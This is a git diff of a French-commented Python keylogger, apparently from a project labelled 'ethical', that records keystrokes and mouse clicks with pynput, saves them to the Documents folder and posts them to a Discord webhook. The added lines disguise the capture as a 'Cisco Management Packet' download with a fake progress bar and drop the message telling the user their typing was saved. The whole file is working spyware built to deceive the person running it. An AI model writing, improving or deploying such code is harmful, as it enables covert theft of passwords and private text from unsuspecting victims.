@@ -1,23 +1,50 @@
 # Keylogger open source - s0d3ep
 # GitHub: https://github.com/waaashed/keylogger-ethical
 
+# Configuration
+RECORD_DURATION = 10  # Temps en secondes
+WEBHOOK_URL = "VOTRE API DISCORD WEBHOOK"  # Renseignez votre API
+
 from flask import Flask, render_template_string
 import os
+import platform
 from pynput import keyboard, mouse
 import time
 import threading
 import requests
 import webbrowser
 
-# Configuration
-DOCUMENTS_PATH = os.path.join(os.path.expanduser('~'), 'Documents')
-FILE_PATH = os.path.join(DOCUMENTS_PATH, "keylogger.txt")
-RECORD_DURATION = 60 # Temps en secondes
-WEBHOOK_URL = "VOTRE API DISCORD WEBHOOK"
-
 app = Flask(__name__)
 
-# HTML template with embedded CSS
+# Obtient le chemin absolu du répertoire "Documents" en fonction de la plateforme
+if platform.system() == 'Windows':
+    documents_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
+else:  # Linux
+    documents_path = os.path.join(os.path.expanduser('~'), 'Documents')
+
+# Chemin du fichier dans le répertoire "Documents"
+file_path = os.path.join(documents_path, "keylogger.txt")
+
+# Assurez-vous que le répertoire existe, s'il n'existe pas encore
+if not os.path.exists(documents_path):
+    os.makedirs(documents_path)
+
+# Durée d'enregistrement en secondes (X secondes)
+record_duration = RECORD_DURATION
+
+# Temps de début d'enregistrement
+start_time = time.time()
+
+# Liste pour stocker les frappes
+key_presses = []
+
+# Initialisation d'une variable pour stocker les clics de souris
+mouse_clicks = 0
+
+# URL du webhook Discord
+webhook_url = WEBHOOK_URL
+
+# Modèle HTML avec le CSS intégré
 template = """
 <!DOCTYPE html>
 <html lang="en">
@@ -78,13 +105,6 @@ template = """
             border-radius: 10px;
             box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
         }
-        /* Crédit à l'auteur */
-        .credit {
-            color: #00ff00;
-            font-size: 12px;
-            text-align: center;
-            margin-top: 10px;
-        }
     </style>
 </head>
 <body>
@@ -92,35 +112,30 @@ template = """
         <h1>Keylogger Report</h1>
         <pre>{{ key_presses }}</pre>
         <p>{{ user_profile }}, n'oublie pas que la curiosité n'est pas toujours bien vue...<br></p>
-        <img src="keylogger_s0d3ep/hackerman.gif" alt="GIF de Hackerman">
-        <div class="credit"># Keylogger open source par s0d3ep - GitHub: <a href="https://github.com/waaashed/keylogger-ethical" target="_blank">https://github.com/waaashed/keylogger-ethical</a></div>
+        <img src="https://media.tenor.com/yOwKX_hMp6cAAAAd/hackerman-rami-malek.gif" alt="GIF de Hackerman">
     </div>
 </body>
 </html>
 """
 
-# Initialisation des variables
-start_time = time.time()
-key_presses = []
-mouse_clicks = 0
-
 # Fonction appelée lorsqu'une touche ou un clic de souris est pressé
 def on_press(key):
-    global mouse_clicks
+    global mouse_clicks  # Utilisez le mot-clé global pour accéder à la variable déclarée en dehors de la fonction
     # Exclut les événements des touches "backspace", "espace" et "enter"
-    if key in [keyboard.Key.backspace, 
-               keyboard.Key.space, 
-               keyboard.Key.enter, 
-               keyboard.Key.caps_lock, 
+    if key in [keyboard.Key.backspace,
+               keyboard.Key.space,
+               keyboard.Key.enter,
+               keyboard.Key.caps_lock,
                keyboard.Key.shift,
-               keyboard.Key.shift_r, 
-               keyboard.Key.alt, 
-               keyboard.Key.alt_l, 
-               keyboard.Key.ctrl, 
-               keyboard.Key.tab, 
-               keyboard.Key.ctrl_r, 
-               keyboard.Key.ctrl_l, 
+               keyboard.Key.shift_r,
+               keyboard.Key.alt,
+               keyboard.Key.alt_l,
+               keyboard.Key.ctrl,
+               keyboard.Key.tab,
+               keyboard.Key.ctrl_r,
+               keyboard.Key.ctrl_l,
                keyboard.Key.alt_gr]:
+
         # Ajoute un espace dans la liste pour rendre plus lisible
         if key == keyboard.Key.space:
             key_presses.append(" ")
@@ -142,7 +157,7 @@ def on_click(x, y, button, pressed):
 
 # Fonction pour lancer le serveur web
 def start_web_server():
-    os.chdir(DOCUMENTS_PATH)
+    os.chdir(documents_path)
 
     # Utilisez l'application Flask pour obtenir le contexte d'application
     with app.app_context():
@@ -161,16 +176,26 @@ def start_web_server():
             "content": "".join(key_presses),
             "username": "Keylogger Bot"
         }
-        requests.post(WEBHOOK_URL, json=payload)
+        requests.post(webhook_url, json=payload)
 
 if __name__ == '__main__':
+    print("Téléchargement de Cisco Management Packet en cours, veuillez ne pas quitter...\n")
+
     # Démarre l'écoute des touches
     with keyboard.Listener(on_press=on_press) as key_listener:
         # Démarre l'écoute des clics de souris
         with mouse.Listener(on_click=on_click) as mouse_listener:
             # Enregistre pendant la durée spécifiée
-            while time.time() - start_time < RECORD_DURATION:
-                pass
+            while time.time() - start_time < record_duration:
+                # Ajoutez ici votre propre logique si nécessaire
+
+                # Barre de progression
+                remaining_time = max(0, record_duration - (time.time() - start_time))
+                progress = int((1 - remaining_time / record_duration) * 50)
+                print(f"\rProgression : [{'#' * progress}{'.' * (50 - progress)}] {int(remaining_time)}s restantes", end='', flush=True)
+                time.sleep(1)  # Mettez à jour la barre toutes les secondes
+            print("\n")
+            print("\nFin de l'installation.")
 
     # Arrête l'écoute des touches et des clics de souris
     key_listener.stop()
@@ -182,11 +207,9 @@ if __name__ == '__main__':
     key_presses.append(message)
 
     # Enregistre les frappes dans le fichier texte
-    with open(FILE_PATH, "w") as file:
+    with open(file_path, "w") as file:
         file.write("".join(key_presses))
 
     # Crée un thread pour le serveur web
     web_server_thread = threading.Thread(target=start_web_server)
     web_server_thread.start()
-
-    print(f"Les frappes ont été enregistrées dans le répertoire Documents dans le fichier {FILE_PATH}")
